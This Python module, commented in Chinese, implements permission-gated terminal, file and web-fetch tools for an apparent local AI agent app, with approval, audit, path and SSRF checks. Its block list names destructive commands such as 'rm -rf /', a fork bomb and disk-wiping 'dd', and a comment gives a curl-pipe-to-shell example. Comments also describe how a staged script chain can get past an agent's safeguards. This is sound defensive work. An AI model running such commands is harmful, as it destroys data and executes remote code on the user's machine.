"""OmegaForge System Tools — 系统级能力（授权制）。

对标 Codex CLI / Cline / ChatGPT Agent 的本机执行能力，但采用
「用户显式授权 + 默认关闭 + 域白名单」安全模型：

  terminal  : 运行命令（超时/输出上限/禁止交互式）
  fs        : 文件读写（默认限定 OMEGAFORGE_HOME 工作区）
  web_fetch : 网页抓取转文本（大小上限，robots 友好提示）

权限开关持久化 OMEGAFORGE_HOME/permissions.json，默认全关。
任何工具在未授权时抛 PermissionError —— 由调用层转成「需要授权」的
用户可见提示。审计日志：每次执行追加 tools_audit.jsonl。
"""
from __future__ import annotations

import json
import os
import re
import subprocess
import tempfile
import time
import urllib.request
from pathlib import Path
from typing import Optional

from ..core.atomicio import atomic_write_json
from ..core.paths import resolve_home
from .policy import (TOOL_RISK, ApprovalRequired, PlanRequired, Policy,
                     audit_write, idem_get, idem_put, issue_approval,
                     verify_approval)
from .rules import RuleStore, critical_check
from .ledger import ContextLedger, nested_script_refs, script_targets
from .normalize import normalize
from . import provenance
from ..core.errors import UserError

PERMISSION_KEYS = ("terminal", "fs", "web_fetch")

# ------------------------------------------------------- 工具参数体积上限
# 这一组常量是工具层体积的唯一真源。各工具不能只靠"默认参数看着够用"：
#   读取   —— 上限若只截断返回值，实际读取仍会把整个文件读进内存
#   写入   —— 内容若无上限，会与知识库等处的体量标准不一致
#   执行命令 —— 子进程输出会被整体读进内存，远大于最终返回的部分
# 三者共同点：上限必须作用在"实际读取"的一侧，只截断返回值等于没限制。
FS_READ_DEFAULT = 65_536      # 单次读取默认字节数
FS_READ_CAP = 1_048_576       # 调用方最多可上调到 1MB，超出按此值收敛
FS_WRITE_CAP = 1_048_576      # 单次写入上限，与 kb/memory 的体量口径对齐
CMD_OUTPUT_CAP = 65_536       # 从临时文件读回的内存上限（防进程被输出撑爆）
CMD_OUTPUT_RETURN = 8_000     # 实际返回给上下文的字符数（既有约定）
WEB_FETCH_DEFAULT = 200_000   # 单次抓取默认字节数
WEB_FETCH_CAP = 1_048_576     # 抓取硬上限
REDIRECT_MAX = 5              # web_fetch 最多跟随的跳转次数


def _as_bytes(v, default: int, cap: int) -> int:
    """把体积类参数收敛到 [1, cap]。

    三类失效都必须在这里收口：
      None    -> 切片不生效，等于读整个文件
      -1      -> 负切片返回"除最后一字节外的全部"，反而放大
      "100"/1.5 -> TypeError 冒泡成 500「操作失败」，用户无从下手
    越界一律收敛而非抛错：体积参数不是语义参数，填大了不该失败，
    只是不该真的按填的值去读。
    """
    try:
        n = int(v)
    except (TypeError, ValueError):
        return default
    if n <= 0:
        return default
    return min(n, cap)

# 危险命令拦截。分两类，原因见下：
#
# 1) 整词类：用分隔符界定，避免 "sudo" 命中 "pseudo"、"reboot" 命中 "rebooted"。
#    注意不能用 \b...\b 通吃 —— 以非单词字符结尾的模式（如 "rm -rf /"）
#    尾部 \b 在行尾不成立，会漏掉最危险的 "rm -rf /"。
# 2) 字面子串类：fork 炸弹含 ()|&{} 等正则元字符，写进正则会被当成语法，
#    例如 ":(){ :|:& };:" 完全不命中。必须按字面匹配。
#
# 注意：su 已从整词表移出，改由 _cmd_dangerous 按"段首词"判定。
# 把 su 留在表里会误杀 `ls -la | grep su`（su 前有空格、后为行尾，
# 整词条件全部成立）——用户只是想把含 su 的行过滤出来，却被安全策略拦下。
_CMD_BLOCK = re.compile(
    r"(?:^|[\s;&|`$(])(?:sudo|mkfs|shutdown|reboot|halt|poweroff)(?:$|[\s;&|)`])"
)
_CMD_DANGER_SUBSTR = (
    "rm -rf /", "rm -fr /", "rm -rf /*", "rm -fr /*",
    "dd if=/dev/zero", "dd if=/dev/random",
    "mkfs.", ":(){ :|:& };:", ":(){ :|: & };:",
    "> /dev/sda", "mv / ", "chmod -r 777 /",
)

# 管道喂解释器：把远程/文件内容直接交给解释器执行。
# 这是黑名单最容易漏的一类——curl 与 sh 分开看都"无害"，
# 合起来等于下载即执行。例如 `curl http://x/s.sh | sh` 在完全访问模式
# 下被整条放行：_CMD_BLOCK 只认 sudo/su 这类特权词，认不出 sh。
# 判据取"管道右侧的首个词"，因此 `ls -la | grep su` 不会误杀（grep 非解释器）。
_PIPE_INTERPRETERS = frozenset((
    "sh", "bash", "zsh", "dash", "ksh", "csh", "tcsh", "fish",
    "python", "python2", "python3", "perl", "ruby", "php", "node",
    "eval", "source",
))


def _seg_head(seg: str) -> str:
    """取一段 shell 命令的首个词（程序名）。"""
    seg = seg.strip()
    if not seg:
        return ""
    # 跳过前导赋值（如 LANG=C python x.py）与 env 前缀
    while True:
        head = re.split(r"[\s;&`<(]", seg, 1)[0]
        if "=" in head and not head.startswith(("/", "-", "$")):
            nxt = seg.split(None, 1)
            if len(nxt) < 2:
                return ""
            seg = nxt[1].strip()
            continue
        return os.path.basename(head).strip("\\\"'").lower()


def _dangerous(cmd: str) -> bool:
    """归一化后做整词 + 字面子串 + 结构三重判定。

    必须先过 L0 归一化：安全判定跑在原始字节上，等于把判定权交给
    攻击者的排版选择。不可见字符（如零宽空格）与形近字符（西里尔字母冒充
    拉丁字母）都会让整条判定清单失效——一个字符就够了。
    """
    # L0：NFKC + 剥零宽/bidi + 同形字折叠。见 normalize.py 顶部说明。
    norm = re.sub(r"\s+", " ", normalize(cmd).strip())
    if _CMD_BLOCK.search(norm):
        return True
    low = norm.lower()
    if any(bad in low for bad in _CMD_DANGER_SUBSTR):
        return True
    return _structural_dangerous(norm)


def _structural_dangerous(norm: str) -> bool:
    """按命令结构判定：切段后只看每段的"位置"，不看词是否出现在别处。

    整词匹配只回答"这个词有没有出现过"，回答不了"它是不是被当成命令执行"。
    `grep su` 里的 su 是参数，`su -` 里的 su 才是动作——位置决定语义。
    """
    for seg in re.split(r"\s*\|\s*", norm):
        head = _seg_head(seg)
        if head in ("su",):
            return True
    # 管道右侧喂解释器
    segs = re.split(r"\s*\|\s*", norm)
    for seg in segs[1:]:
        if _seg_head(seg) in _PIPE_INTERPRETERS:
            return True
    return False


def _home() -> Path:
    # 唯一真源在 core/paths.py；保留薄封装以兼容既有调用点。
    return Path(resolve_home())


class BlockedCommand(ValueError):
    """命中危险命令黑名单。

    继承 ValueError 以兼容既有用法，
    但在 _classify 里单独映射成明确中文提示——用户需要知道是踩了安全
    策略，而不是收到一句"请求内容有误，请检查后重试"去反复重试。
    """


class Permissions:
    def __init__(self, home: Optional[str] = None):
        self._home = home

    @property
    def path(self) -> Path:
        # 惰性：见 core/paths.py。若在 __init__ 期固化，模块级单例
        # SYSTOOLS 一旦被 import，改 OMEGAFORGE_HOME 后仍读写旧目录。
        return Path(resolve_home(self._home)) / "permissions.json"

    def load(self) -> dict:
        if self.path.is_file():
            try:
                d = json.loads(self.path.read_text(encoding="utf-8"))
                return {k: bool(d.get(k, False)) for k in PERMISSION_KEYS}
            except (json.JSONDecodeError, OSError):
                pass
        return {k: False for k in PERMISSION_KEYS}

    def save(self, perms: dict) -> dict:
        clean = {k: bool(perms.get(k, False)) for k in PERMISSION_KEYS}
        self.path.parent.mkdir(parents=True, exist_ok=True)
        atomic_write_json(self.path, clean)
        return clean


def _audit(tool: str, detail: str) -> None:
    try:
        p = _home() / "tools_audit.jsonl"
        p.parent.mkdir(parents=True, exist_ok=True)
        with open(p, "a", encoding="utf-8") as f:
            f.write(json.dumps({"ts": time.time(), "tool": tool,
                                "detail": detail[:300]},
                               ensure_ascii=False) + "\n")
    except OSError:
        pass


class CapabilityDenied(PermissionError):
    """系统能力未授权。

    必须独立于内置 PermissionError：
    内置 PermissionError 在 _classify 里被归为「读写失败，请检查运行目录权限」，
    否则用户会看到完全错误的引导（去查磁盘权限，实际是开关没开）。
    """

    def __init__(self, key: str):
        super().__init__(key)
        self.capability = key


def _check(perms: Permissions, key: str) -> None:
    if not perms.load().get(key):
        raise CapabilityDenied(key)


# -- MCP 作用域 ----------------------------------------------------------
#
# 用户为本机使用开启 fs 能力 + full（完全访问）模式后，
# 一个未获得用户授权的第三方 MCP host，同样能用 fs.list 列出
# home 目录，拿到 permissions.json / context_ledger.json 等内部文件名。
#
# 根因：能力开关是进程级的，没有"调用来源"这个概念。但"用户信任自己在
# 本 app 里点的操作"不等于"用户信任另一个应用里的远程模型"——这两件事
# 被同一份 permissions.json 混淆了。
#
# 更硬的约束在审批：ApprovalRequired 是一条**人机交互通道**，它假设界面
# 能弹窗、用户能点确认。MCP stdio 下 host 是另一个进程，这条通道不存在。
# 于是"需要确认才执行"的裁决在 MCP 下既不成立也不失败，而是退化成一个
# 永远无法完成的悬空状态。必须显式收口，不能让它静默退化。
#
# 因此：只读类默认允许（MCP 客户端通常就是为了读上下文），写与执行类
# 必须显式开启，且**不继承本机的同义开关**。
MCP_SCOPE_DEFAULTS = {"terminal": False, "fs.write": False, "web_fetch": False,
                      # 个人数据的写工具必须有作用域：若绕过统一分发直接
                      # 调用，外部客户端在最保守档下照样能往用户的知识库、
                      # 记忆、词条库、待办里写，且审计里不留任何记录。
                      #
                      # 对外标注已声明这是破坏性操作，裁决就必须真的执行，
                      # 否则标注与实际行为不一致。
                      #
                      # 默认关闭，与 fs.write 一致：写用户数据要显式授权。
                      # 读工具（kb_search / memory_recall / wiki_get /
                      # task_list）不在此列——"让外部 agent 用我的知识库"
                      # 是接 MCP 的主要理由，读不该被一起关掉。
                      "kb_add": False, "kb_delete": False,
                      "memory_remember": False,
                      "wiki_save": False, "wiki_delete": False,
                      "task_add": False, "task_done": False,
                      "task_delete": False}

_MCP_SCOPE_CN = {
    "terminal": "执行终端命令",
    "fs.write": "写入本地文件",
    "web_fetch": "访问网页",
    "kb_add": "写入知识库",
    "kb_delete": "删除知识库条目",
    "memory_remember": "记住事实",
    "wiki_save": "保存词条",
    "wiki_delete": "删除词条",
    "task_add": "新增待办",
    "task_done": "完成待办",
    "task_delete": "删除待办",
}


class McpScopeDenied(Exception):
    """MCP 客户端越出了作用域（不继承本机执行权限）。"""

    def __init__(self, tool: str):
        super().__init__(tool)
        self.tool = tool


class McpScope:
    """MCP 作用域开关，独立于本机 permissions.json。

    单独存文件而非塞进 PERMISSION_KEYS：后者会被设置界面渲染成"系统能力"
    列表，把"本 app 的能力"和"外部客户端的能力"并列展示，用户无从分辨
    关掉一个会影响谁。
    """

    def __init__(self, home: Optional[str] = None):
        self._home = home

    @property
    def path(self) -> Path:
        return Path(resolve_home(self._home)) / "mcp_scope.json"

    def load(self) -> dict:
        if self.path.is_file():
            try:
                d = json.loads(self.path.read_text(encoding="utf-8"))
                return {k: bool(d.get(k, MCP_SCOPE_DEFAULTS.get(k, False)))
                        for k in MCP_SCOPE_DEFAULTS}
            except (json.JSONDecodeError, OSError):
                pass
        return dict(MCP_SCOPE_DEFAULTS)

    def save(self, scope: dict) -> dict:
        clean = {k: bool(scope.get(k, MCP_SCOPE_DEFAULTS.get(k, False)))
                 for k in MCP_SCOPE_DEFAULTS}
        self.path.parent.mkdir(parents=True, exist_ok=True)
        atomic_write_json(self.path, clean)
        return clean


class SystemTools:
    # 传递引用解析上限。递归解析必须是有界的：脚本可以 source 自己，
    # 也可以铺出很长的链——没有上限的话，"安全检查"本身就成了新的
    # DoS 面（这是个自指风险，挡攻击的组件被攻击拖垮最讽刺）。
    MAX_SCRIPT_DEPTH = 3        # source 链的最大层数
    MAX_SCRIPT_FILES = 12       # 一次判定最多读多少文件
    MAX_SCRIPT_BYTES = 500_000  # 一次判定最多读多少字节

    def __init__(self, home: Optional[str] = None, origin: Optional[str] = None):
        # 子对象只接收"显式 home"（可能是 None），由它们各自惰性解析。
        # 若先解析出具体路径再传下去，等于把当前环境固化进多个子对象。
        self._home = home
        self.perms = Permissions(home)
        self.policy = Policy(home)
        self.rules = RuleStore(home)
        self.ledger = ContextLedger(home)
        self.scope = McpScope(home)
        # 调用来源：本机界面为 None，MCP 客户端为 "mcp"。审计必须区分来源，
        # 否则"谁发起的这次执行"事后无从查证。
        self.origin = origin

    @property
    def home(self) -> Path:
        return Path(resolve_home(self._home))

    @home.setter
    def home(self, v) -> None:
        self._home = str(v) if v else None
        # 子对象同步：否则赋 home 后子对象仍按旧 home 读写，出现错配
        for sub in ("perms", "policy", "rules", "ledger", "scope"):
            obj = getattr(self, sub, None)
            if obj is not None:
                setattr(obj, "_home", self._home)


    # -- 门禁 ------------------------------------------------------------
    def _gate(self, tool: str, args: Optional[dict] = None,
              approval: Optional[str] = None) -> str:
        """能力开关 AND 四级矩阵。两者缺一不可，见 policy.py 顶部说明。

        返回本次真实裁决（allow / approved / plan），供调用方写入审计。
        裁决必须逐次返回真实结果：若一律按"自动放行"记录，"用户批准后
        执行"与"自动放行"在审计里无法区分，被拒绝的尝试也不留痕——
        审计只记成功不记拒绝，等于没有审计。
        """
        # 未知工具按最严处理。这里必须用容错取值而非硬索引：硬索引失败会
        # 冒泡成内部错误，而决策层用的是容错取值，两侧口径不一致。
        cap, risk = TOOL_RISK.get(tool, ("", "high"))
        ev = {"tool": tool, "risk": risk, "mode": self.policy.mode(),
              "capability": cap, "origin": self.origin}

        # 1) critical 清单先于一切，full（完全访问）也不可放行。
        #    否则"减少确认次数"就变成了"连凭据文件也一并放行"。
        why = critical_check(tool, args)
        if why:
            audit_write(dict(ev, verdict="deny", reason="critical",
                             detail=why))
            raise BlockedCommand(why)

        # 2) 规则记忆：命中即按规则裁决，deny 优先于 allow（见 rules.py）
        rule = self.rules.match(tool, args)
        if rule is not None:
            dec = rule.get("decision", "ask")
            if dec == "deny":
                audit_write(dict(ev, verdict="deny", reason="rule",
                                 rule_id=rule.get("id")))
                raise BlockedCommand("该操作已被安全规则拒绝")
            if dec == "allow":
                audit_write(dict(ev, verdict="allow", reason="rule",
                                 rule_id=rule.get("id"),
                                 scope=rule.get("scope")))
                return "allow"
            # ask：落到下面的统一审批流程，但审计里留下来源

        # 3) MCP 作用域：外部客户端不继承本机执行权限。
        #    必须**先于**本机 capability 判定——否则 capability 关闭时
        #    返回的引导是"请在设置→系统能力中开启"，等于诱导外部 host
        #    去开本机的开关，正是这里要防的传导。
        if self.origin == "mcp" and tool in MCP_SCOPE_DEFAULTS:
            if not self.scope.load().get(tool):
                audit_write(dict(ev, verdict="deny", reason="mcp_scope_off"))
                raise McpScopeDenied(tool)

        if cap and not self.perms.load().get(cap):
            audit_write(dict(ev, verdict="deny", reason="capability_off"))
            raise CapabilityDenied(cap)
        d = self.policy.decide(tool)
        if d["verdict"] == "allow":
            audit_write(dict(ev, verdict="allow"))
            return "allow"
        if d["verdict"] == "plan":
            audit_write(dict(ev, verdict="plan"))
            raise PlanRequired(tool, {"tool": tool, "args": args or {},
                                      "risk": d["risk"], "mode": d["mode"]})
        if approval and verify_approval(approval, tool, args):
            audit_write(dict(ev, verdict="approved"))
            return "approved"
        audit_write(dict(ev, verdict="ask"))
        raise ApprovalRequired(
            tool, d["risk"], issue_approval(tool, args, d["mode"]),
            f"当前权限级别「{d['mode_label']}」下该操作需要确认",
            origin=self.origin)

    # -- terminal --------------------------------------------------------
    def _aggregate_check(self, cmd: str) -> None:
        """聚合上下文检查：单条命令无害，不代表"命令 + 它引用的文件"无害。

        四步攻击链在完全访问模式下会被逐步放行：写碎片 -> cat 拼接 ->
        bash 执行。危险不在任何一条消息里，只存在于累积结果中，所以必须
        在执行前把被引用的文件**实际读出来**再判一次——
        拼接产物的内容，只有读到才知道。
        """
        found = self._scan_script_chain(script_targets(cmd))
        if found:
            rel, body = found
            why = f"被执行的脚本 {rel} 内容命中安全策略"
            audit_write({"tool": "terminal", "risk": "critical",
                         "mode": self.policy.mode(), "verdict": "deny",
                         "reason": "aggregate_script",
                         "detail": f"{why} :: {str(cmd)[:200]}"})
            self.ledger.add("exec", rel, body[:500], risk=True)
            raise BlockedCommand(
                f"该命令要执行的脚本内容具有破坏性，已被安全策略拦截（{rel}）")
        self.ledger.add("exec", str(cmd)[:200], cmd, risk=False)

    def _scan_script_chain(self, targets: list) -> Optional[tuple]:
        """沿 source / bash 链递归找出第一个危险的脚本。

        为什么必须递归：危险内容可以藏在任何一层。`combined.sh` 正文
        只是 `source payload.sh`，单层解析看到的是一段无害文本。

        三重上限（缺一不可）：
          depth —— 防止 self-source 死循环
          files —— 防止铺很多文件拖慢每次执行
          bytes —— 防止大文件把内存吃掉
        任一项超限就停止深挖并放行：这是有意的 fail-open 取舍——
        超限说明链条异常，但继续挖会把"安全检查"变成拒绝服务面。
        """
        seen: set = set()
        used = [0, 0]           # [files, bytes]

        def walk(rels, depth):
            if depth > self.MAX_SCRIPT_DEPTH:
                return None
            for rel in rels:
                key = os.path.basename(str(rel))
                if key in seen:
                    continue    # 环：已看过，不再展开
                seen.add(key)
                try:
                    p = self._safe_path(rel)
                except ValueError:
                    continue    # 工作区外的脚本不归我们管
                if not p.is_file():
                    continue
                used[0] += 1
                if used[0] > self.MAX_SCRIPT_FILES:
                    return None
                try:
                    body = p.read_text(encoding="utf-8", errors="replace")
                except OSError:
                    continue
                used[1] += len(body)
                if used[1] > self.MAX_SCRIPT_BYTES:
                    return None
                if _dangerous(body):
                    return (rel, body)
                # 本层无害，继续追它引用的下一层
                deeper = walk(nested_script_refs(body), depth + 1)
                if deeper:
                    return deeper
            return None

        return walk(targets, 0)

    def run_command(self, cmd: str, timeout: int = 20,
                    approval: Optional[str] = None,
                    idem_key: Optional[str] = None) -> dict:
        hit = idem_get(idem_key or "")
        if hit is not None:
            return dict(hit, idempotent_replay=True)
        # 参数校验必须前置于门禁：用户把命令填成空，应立刻得到格式提示，
        # 而不是先被要求授权。门禁的职责是"该不该做"，不是"填得对不对"，
        # 二者顺序颠倒会让用户收到驴唇不对马嘴的引导。
        if not cmd or not cmd.strip():
            raise ValueError("command required")
        if _dangerous(cmd):
            # 被拒绝的尝试同样必须留痕：拒绝路径若不写审计，"谁在何时试图
            # 执行被禁命令"就无从查证。
            audit_write({"tool": "terminal", "risk": "critical",
                         "mode": self.policy.mode(), "verdict": "deny",
                         "reason": "blocked_command",
                         "detail": str(cmd)[:300]})
            raise BlockedCommand("该命令具有破坏性，已被安全策略拦截")
        self._aggregate_check(cmd)
        gv = self._gate("terminal", {"cmd": cmd}, approval)
        timeout = max(1, min(int(timeout), 60))
        try:
            # 输出不再进内存：capture_output=True 会把进程的全部输出收进内存，
            # 再截断到 8000 字符——上限只作用在返回侧，没作用在读的一侧。
            # 例如 `head -c 200M /dev/zero` 峰值 584MB RSS，默认 20 秒超时内
            # 足以把进程撑爆。改成先落临时文件、只读前 CMD_OUTPUT_CAP 字节，
            # 内存占用与输出量脱钩；落盘也顺带避免了管道写满导致的阻塞。
            with tempfile.TemporaryFile() as buf:
                r = subprocess.run(cmd, shell=True, stdout=buf, stderr=buf,
                                   timeout=timeout, cwd=str(self.home))
                total = buf.seek(0, os.SEEK_END)
                buf.seek(0)
                out = buf.read(CMD_OUTPUT_CAP).decode("utf-8", errors="replace")
            result = {"ok": r.returncode == 0, "code": r.returncode,
                      "output": out[:CMD_OUTPUT_RETURN],
                      # truncated 必须按"返回侧"判定。按内存上限 64KB 判的话，
                      # 19KB 输出会被截到 8000 字符却标 truncated=False——
                      # 用户以为看到的是全部，实际少了一多半。
                      "truncated": total > CMD_OUTPUT_RETURN}
        except subprocess.TimeoutExpired:
            result = {"ok": False, "code": -1, "output": f"timeout {timeout}s"}
        audit_write({"tool": "terminal", "detail": str(cmd)[:300],
                     "risk": "high", "mode": self.policy.mode(),
                     "verdict": gv, "ok": result.get("ok")})
        idem_put(idem_key or "", result)
        return result

    # -- filesystem --------------------------------------------------------
    def _safe_path(self, rel: str) -> Path:
        root = self.home.resolve()
        p = (self.home / rel).resolve()
        # 不能用字符串 startswith —— 同级目录 ".omegaforge_evil" 同样以
        # ".omegaforge" 开头，可用 "../.omegaforge_evil/x" 越权读取。
        try:
            p.relative_to(root)
        except ValueError:
            # 越界读取是明确的探测行为，必须留痕
            audit_write({"tool": "fs", "risk": "critical",
                         "mode": self.policy.mode(), "verdict": "deny",
                         "reason": "path_escapes_workspace",
                         "detail": str(rel)[:300]})
            raise ValueError("path escapes workspace")
        return p

    def _taint(self, res: dict, text: str, source: str) -> None:
        """给外部内容打来源标记（provenance taint）。

        不改 `text` 原文（对外口径不变），另附 untrusted / source /
        injection_tags / text_wrapped。喂模型的一侧应当用 text_wrapped：
        它把内容降级为"被引用的数据"，而不是与用户指令同构的文本。
        命中可疑句式时额外写一条审计——不阻断，只留痕。
        """
        try:
            t = provenance.taint(text, source)
        except Exception:
            return          # 标记失败绝不能让读取本身失败
        # 逐字段赋值，不能用 res.update(t)：taint() 返回里也有 "text" 键
        # （包裹后版本），update 会把它覆盖到 res["text"] 上，导致原文丢失、
        # 约定被破坏。text 必须保持原文，包裹版只走 text_wrapped。
        res["untrusted"] = t["untrusted"]
        res["source"] = t["source"]
        res["injection_tags"] = t["injection_tags"]
        res["suspicious"] = t["suspicious"]
        res["text_wrapped"] = t["text"]
        if t["suspicious"]:
            audit_write({"tool": "provenance.taint", "detail": source[:300],
                         "risk": "medium", "mode": self.policy.mode(),
                         "verdict": "marked",
                         "tags": ",".join(t["injection_tags"])})

    def fs_read(self, rel: str, max_bytes: int = FS_READ_DEFAULT,
                approval: Optional[str] = None,
                idem_key: Optional[str] = None) -> dict:
        hit = idem_get(idem_key or "")
        if hit is not None:
            return dict(hit, idempotent_replay=True)
        gv = self._gate("fs.read", {"rel": rel}, approval)
        p = self._safe_path(rel)
        if not p.is_file():
            raise FileNotFoundError(rel)
        max_bytes = _as_bytes(max_bytes, FS_READ_DEFAULT, FS_READ_CAP)
        # 读取量必须受 max_bytes 约束。原实现 read_bytes() 先把整个文件读进
        # 内存、再切片丢弃——max_bytes 只挡住了返回值，没挡住内存。工作区里
        # 放一个 1GB 日志，一次默认 fs_read 就能把进程撑爆，而这不需要调用方
        # 传任何特殊参数。改成只读需要的字节数，读取量随 max_bytes 收敛。
        with open(p, "rb") as f:
            data = f.read(max_bytes)
        raw = data.decode("utf-8", errors="replace")
        size = p.stat().st_size
        res = {"path": rel, "bytes": size, "text": raw,
               "truncated": size > len(data)}
        self._taint(res, raw, f"file:{rel}")
        audit_write({"tool": "fs.read", "detail": str(rel)[:300],
                     "risk": "low", "mode": self.policy.mode(),
                     "verdict": gv})
        idem_put(idem_key or "", res)
        return res

    def fs_write(self, rel: str, content: str,
                 approval: Optional[str] = None,
                 idem_key: Optional[str] = None) -> dict:
        hit = idem_get(idem_key or "")
        if hit is not None:
            return dict(hit, idempotent_replay=True)
        gv = self._gate("fs.write", {"rel": rel, "bytes": len(content or "")},
                   approval)
        # 体量上限：与知识库、记忆的体量口径对齐。若某个写入口没有上限，
        # 同一份超长内容走别的入口会被拒、走这里照写不误，双标会让用户以为
        # "换个入口就能存下"。
        # 抛 UserError 而非 ValueError：ValueError 会被 _classify 压成通用的
        # 「请求内容有误」，写好的提示根本到不了界面。
        # 不静默截断——截断等于悄悄丢掉用户内容。
        n = len((content or "").encode("utf-8"))
        if n > FS_WRITE_CAP:
            raise UserError(
                f"单次写入上限 {FS_WRITE_CAP // 1024} KB，"
                f"本次 {n // 1024} KB，请拆分后再写入")
        p = self._safe_path(rel)
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
        # 写入不阻断：`rm -rf /` 出现在 .md 里是写文档，出现在 .sh 里并被
        # 执行才是攻击。这里只记"危险素材已落地"，由执行侧判定意图。
        self.ledger.add("write", rel, content or "",
                        risk=_dangerous(content or ""))
        res = {"path": rel, "bytes": len(content.encode())}
        audit_write({"tool": "fs.write", "detail": str(rel)[:300],
                     "risk": "medium", "mode": self.policy.mode(),
                     "verdict": gv})
        idem_put(idem_key or "", res)
        return res

    def fs_list(self, rel: str = ".", approval: Optional[str] = None,
                idem_key: Optional[str] = None) -> dict:
        hit = idem_get(idem_key or "")
        if hit is not None:
            return dict(hit, idempotent_replay=True)
        gv = self._gate("fs.list", {"rel": rel}, approval)
        base = self._safe_path(rel)
        items = []
        for p in sorted(base.iterdir())[:200]:
            items.append({"name": p.name,
                          "dir": p.is_dir(),
                          "size": p.stat().st_size if p.is_file() else 0})
        res = {"items": items}
        audit_write({"tool": "fs.list", "detail": str(rel)[:300],
                     "risk": "low", "mode": self.policy.mode(),
                     "verdict": gv})
        idem_put(idem_key or "", res)
        return res

    # -- web fetch ---------------------------------------------------------
    def web_fetch(self, url: str, max_bytes: int = WEB_FETCH_DEFAULT,
                  approval: Optional[str] = None,
                  idem_key: Optional[str] = None) -> dict:
        hit = idem_get(idem_key or "")
        if hit is not None:
            return dict(hit, idempotent_replay=True)
        if not re.match(r"^https?://", url):
            raise ValueError("http(s) url required")
        gv = self._gate("web_fetch", {"url": url}, approval)
        _guard_public_url(url)
        max_bytes = _as_bytes(max_bytes, WEB_FETCH_DEFAULT, WEB_FETCH_CAP)
        req = urllib.request.Request(
            url, headers={"User-Agent": "OmegaForge/0.2 (+local agent)"})
        opener = urllib.request.build_opener(_GuardedRedirectHandler)
        with opener.open(req, timeout=20) as r:
            ct = r.headers.get("Content-Type", "")
            raw = r.read(max_bytes)
        text = raw.decode("utf-8", errors="replace")
        if "html" in ct:
            text = re.sub(r"<script[\s\S]*?</script>|<style[\s\S]*?</style>",
                          " ", text)
            text = re.sub(r"<[^>]+>", " ", text)
            text = re.sub(r"\s+", " ", text).strip()
        res = {"url": url, "content_type": ct,
               "truncated": len(raw) >= max_bytes, "text": text[:8000]}
        self._taint(res, text[:8000], f"web:{url}")
        audit_write({"tool": "web_fetch", "detail": str(url)[:300],
                     "risk": "medium", "mode": self.policy.mode(),
                     "verdict": gv})
        idem_put(idem_key or "", res)
        return res


class _GuardedRedirectHandler(urllib.request.HTTPRedirectHandler):
    """跳转目标必须重新过一遍 SSRF 校验。

    地址校验只覆盖**初始**地址。公网域名 302 跳转到本机或云服务元数据
    地址时，请求库默认跟随跳转，元数据会被原样读回——只校初始地址
    挡不住跳转。同时限制跳数与协议，避免 file:// 之类落到别的处理器。
    """

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        hops = getattr(self, "_hops", 0) + 1
        self._hops = hops
        if hops > REDIRECT_MAX:
            raise urllib.error.HTTPError(
                req.full_url, code, "跳转次数超过上限", headers, fp)
        if not re.match(r"^https?://", newurl):
            raise UserError("跳转目标不是 http(s) 地址，已拒绝")
        _guard_public_url(newurl)
        why = critical_check("web_fetch", {"url": newurl})
        if why:
            raise BlockedCommand(why)
        return super().redirect_request(req, fp, code, msg, headers, newurl)


def _guard_public_url(url: str) -> None:
    """拒绝内网 / 本机 / 云元数据地址（SSRF 防护）。

    说明：解析后校验存在 DNS rebinding 的理论窗口，本步不能替代网络层隔离；
    但它能挡住最常被滥用的直连场景（127.0.0.1、169.254.169.254、10/8 等）。
    """
    import ipaddress
    import socket
    from urllib.parse import urlparse

    host = (urlparse(url).hostname or "").strip("[]").lower()
    if not host:
        raise ValueError("invalid url host")
    if host in {"localhost", "localhost.localdomain"}:
        raise ValueError("blocked internal address")

    def _reject(ip: str) -> None:
        try:
            a = ipaddress.ip_address(ip)
        except ValueError:
            raise ValueError("invalid url host")
        if (a.is_private or a.is_loopback or a.is_link_local
                or a.is_reserved or a.is_multicast or a.is_unspecified):
            raise ValueError("blocked internal address")

    try:
        ipaddress.ip_address(host)
    except ValueError:
        pass
    else:
        _reject(host)
        return
    try:
        infos = socket.getaddrinfo(host, None)
    except socket.gaierror:
        raise ValueError("域名无法解析，请检查网址")
    for info in infos:
        _reject(info[4][0])


def tool_dispatch(name: str, args: dict, home: Optional[str] = None,
                  approval: Optional[str] = None,
                  idem_key: Optional[str] = None,
                  origin: Optional[str] = None) -> dict:
    """统一工具入口。approval / idem_key 由调用层（HTTP）透传：

    approval —— 一次性审批凭证，只放行本次，不提升权限级别
    idem_key —— 幂等键；同键重放返回首次结果，不重复执行
    origin   —— 调用来源（本机界面为 None，MCP 客户端为 "mcp"）。
                决定作用域与审计归属，见 McpScope 说明。
    """
    # 参数必须是字典：后续各分支一律用 args.get(...) 取字段，非字典会
    # 崩在取字段的那一刻，并被统一转译层压成无信息量的内部故障文案。
    if not isinstance(args, dict):
        raise UserError("工具参数格式不正确，请填写一组参数")
    st = SystemTools(home, origin=origin)
    kw = {"approval": approval, "idem_key": idem_key}
    if name == "run_command":
        return st.run_command(str(args.get("cmd", "")),
                              _as_timeout(args.get("timeout", 20)), **kw)
    if name == "fs_read":
        return st.fs_read(str(args.get("path", "")), **kw)
    if name == "fs_write":
        return st.fs_write(str(args.get("path", "")),
                           str(args.get("content", "")), **kw)
    if name == "fs_list":
        return st.fs_list(str(args.get("path", ".")), **kw)
    if name == "web_fetch":
        return st.web_fetch(str(args.get("url", "")), **kw)
    # 必须抛 UserError：ValueError 会被统一转译层压成无信息量的兜底句，
    # 使用者不知道填错了哪一项，只会反复提交同一个不存在的名字。
    # 只列展示名会造成死循环：使用者（人或模型）照提示填「运行终端命令」
    # 会再次被拒，而错误信息一模一样，永远无法自行纠正。提示必须给出
    # 真正可提交的标识。
    known = (("run_command", "运行终端命令"),
             ("fs_read", "读取本地文件"),
             ("fs_write", "写入本地文件"),
             ("fs_list", "查看本地目录"),
             ("web_fetch", "访问网页"))
    listing = "、".join(f"{ident}（{label}）" for ident, label in known)
    raise UserError(f"没有名为「{name}」的工具，可用工具：{listing}。"
                    f"请填写括号前的标识")


def _as_timeout(v) -> int:
    """timeout 兜底。

    传入空值、字符串或数组会在取值处触发类型错误，而崩溃发生在工具
    分发这一层——写在子函数里的保护根本没机会执行，异常直接冒泡为
    服务端错误。因此校验必须提到入口。
    """
    try:
        return max(1, min(int(v), 60))
    except (TypeError, ValueError):
        return 20
